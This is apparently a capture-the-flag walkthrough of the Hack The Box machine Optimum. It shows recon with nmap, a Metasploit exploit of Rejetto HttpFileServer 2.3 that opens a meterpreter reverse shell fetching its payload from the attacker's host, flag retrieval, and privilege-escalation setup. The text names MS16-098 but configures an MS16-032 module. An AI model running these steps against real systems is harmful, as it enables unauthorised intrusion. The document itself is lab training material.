# About Optimum

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete. 

## Area of Interest
Learn about the technology and tools that can be found in Optimum
- Injections Software & OS exploitation 
- Security Tools 
- Web Application 
- Vulnerability Assessment
## Vulnerability
Learn about the vulnerabilities and systems that can be found in Optimum
- OS Command Injection
## Language
Learn about the languages required to play Optimum
- Python 

# Walkthrough

## Phase 1: Recon

Pinging the target for Checking whether the target is up or not.

```bash
ashu@kali ~ ping -c 3 optimum.htb
PING optimum.htb (10.10.10.8) 56(84) bytes of data.
64 bytes from optimum.htb (10.10.10.8): icmp_seq=1 ttl=127 time=125 ms
64 bytes from optimum.htb (10.10.10.8): icmp_seq=2 ttl=127 time=147 ms
64 bytes from optimum.htb (10.10.10.8): icmp_seq=3 ttl=127 time=127 ms

--- optimum.htb ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 125.073/133.203/147.247/9.971 ms
```

Target is **up**.

Scanning the target and let's see what ports are opened.

```bash
ashu@kali ~ sudo nmap -sV -T4 optimum.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 16:26 IST
Nmap scan report for optimum.htb (10.10.10.8)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.08 seconds
```


So, Apparently there is a File Share server running on Port **80.*

Let's open it up in browser and check.

![[Pasted image 20250810162936.png]]

So, The version shows up ***HttpFileServer 2.3***.

Let's `searchsploit` to check if this is vulnerable or not.

```bash
ashu@kali ~ searchsploit httpfileserver 2.3
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                            | windows/webapps/49125.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

So, it is vulnerable to **RCE**. 

## Phase 2: Exploitation

Let's fire up metasploit and Hack The Box.

```bash
ashu@kali ~ msfconsole -q
msf6 > search httpfileserver 2.3                                                                                                                                         16:33:01 [58/58]

Matching Modules                                                                                                                                                                         
================                                                                                                                                                                         
                                                                                                                                                                                         
   #  Name                                   Disclosure Date  Rank       Check  Description                                                                                              
   -  ----                                   ---------------  ----       -----  -----------                                                                                              
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution                                                          
                                                                                                                                                                                         
                                                                                                                                                                                         
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec                                                                          
                                                                                                                                                                                         
msf6 > use 0                                                                                                                                                                             
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                                                                 
msf6 exploit(windows/http/rejetto_hfs_exec) > show options                                                                                                                               
                                                                                                                                                                                         
Module options (exploit/windows/http/rejetto_hfs_exec):                                                                                                                                  
                                                                                                                                                                                         
   Name       Current Setting  Required  Description                                                                                                                                     
   ----       ---------------  --------  -----------                                                                                                                                     
   HTTPDELAY  10               no        Seconds to wait before terminating web server                                                                                                   
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http                           
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                                          
   RPORT      80               yes       The target port (TCP)                                                                                                                           
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.           
   SRVPORT    8080             yes       The local port to listen on.                                                                                                                    
   SSL        false            no        Negotiate SSL/TLS for outgoing connections                                                                                                      
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)                                                                                
   TARGETURI  /                yes       The path of the web application                                                                                                                 
   URIPATH                     no        The URI to use for this exploit (default is random)                                                                                             
   VHOST                       no        HTTP server virtual host                                                                                                                        
                                                                                                                                                                                         
                                                                                                                                                                                         
Payload options (windows/meterpreter/reverse_tcp):                                                                                                                                       
                                                                                                                                                                                         
   Name      Current Setting  Required  Description                                                                                                                                      
   ----      ---------------  --------  -----------                                                                                                                                      
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                        
   LHOST     192.168.188.249  yes       The listen address (an interface may be specified)                                                                                               
   LPORT     4444             yes       The listen port                                                                                                                                  
                                                                                                                                                                                         
                                                                                                                                                                                         
Exploit target:                                                                                                                                                                          
                                                                                                                                                                                         
   Id  Name                                                                                                                                                                              
   --  ----                                                                                                                                                                              
   0   Automatic                                                                                                                                                                         
                                                                                                                                                                                         
                                                                                                                                                                                         
                                                                                                                                                                                         
View the full module info with the info, or info -d command.                                                                                                                             
                                                                                                                                                                                         
msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS optimum.htb                                                                                                                    
RHOSTS => optimum.htb   
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
LHOST => 10.10.14.14
```

So, we have setup everything let's fire this thing up.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] Using URL: http://10.10.14.14:8080/D6slFNBAmEyQpQ
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /D6slFNBAmEyQpQ
[*] Sending stage (177734 bytes) to 10.10.10.8
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' 
in regular expression
[!] Tried to delete %TEMP%\TAYMzWYczofvnB.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.8:49162) at 2025-08-10 16:33:27 +0530
[*] Server stopped.

meterpreter > 
```

We have successfully gained a reverse shell on this machine. Now, let's get the flags.

```bash
meterpreter > shell
Process 956 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

16/08/2025  10:37     <DIR>          .
16/08/2025  10:37     <DIR>          ..
16/08/2025  10:37     <DIR>          %TEMP%
18/03/2017  03:11            760.320 hfs.exe
16/08/2025  10:25                 34 user.txt
               2 File(s)        760.354 bytes
               3 Dir(s)   5.674.889.216 bytes free

C:\Users\kostas\Desktop>type user.txt
type user.txt
c65ab7f0f770f36d90e9550352da1c09

```

## Phase 3: Privilege Escalation

We can use Meterpreter’s built-in “upload” command to transfer winpeas.exe over to the target machine. WinPEAS (Windows Privilege Escalation Awesome Script) is a security tool used for enumerating potential privilege escalation paths on Windows systems. It scans for misconfigurations, credential leaks, vulnerable services, and other weaknesses that attackers or security professionals can exploit:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/0*C47_pE4M5sa32O5D)

Using Meterpreter to upload WinPEAS

When we run winpeas.exe, we should see a command-line art picture of a pea:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/0*wgxITYo_jYFwFiaP)

Starting WinPEAS

Interestingly enough, the most valuable bit of information we got from WinPEAS could have been gathered with a simple systeminfo command, but either way we find the OS Version:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/0*DlecAJZdT9FeP8sn)

WinPEAS revealing our target’s OS Version

When we research any vulnerabilities for the OS Version, we find MS16–098 on ExploitDB (https://www.exploit-db.com/exploits/41020):

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/0*ohfIV0eziW3EYCmb)

ExploitDB page for a privilege escalation exploit

The website has a download link for the exploit written in C, but we want the Binary. Basically MS16–098 is a Windows privilege escalation vulnerability in the Windows Kernel-Mode Drivers that allows an attacker to gain SYSTEM privileges. It occurs due to improper handling of certain graphic-related system calls in the Win32k.sys driver. We should download it to our system then upload it with our Meterpreter shell:


```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options                                                                                     16:58:57 [159/159]
                                                                                                                                                                                         
Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):                                                                                                          
                                                                                                                                                                                         
   Name     Current Setting  Required  Description                                                                                                                                       
   ----     ---------------  --------  -----------                                                                                                                                       
   SESSION  1                yes       The session to run this module on                                                                                                                 
                                                                                                                                                                                         
                                                                                                                                                                                         
Payload options (windows/meterpreter/reverse_tcp):                                                                                                                                       
                                                                                                                                                                                         
   Name      Current Setting  Required  Description                                                                                                                                      
   ----      ---------------  --------  -----------                                                                                                                                      
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                        
   LHOST     192.168.188.249  yes       The listen address (an interface may be specified)                                                                                               
   LPORT     4444             yes       The listen port                                                                                                                                  
                                                                                                                                                                                         
                                                                                                                                                                                         
Exploit target:                                                                                                                                                                          
                                                                                                                                                                                         
   Id  Name                                                                                                                                                                              
   --  ----                                                                                                                                                                              
   0   Windows x86                                                                                                                                                                       
                                                                                                                                                                                         
                                                                                                                                                                                         
                                                                                                                                                                                         
View the full module info with the info, or info -d command.  

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST tun0
LHOST => 10.10.14.14

```

We, have setup the exploit. Now, Let's run this and elevate.

![[Pasted image 20250810171532.png]]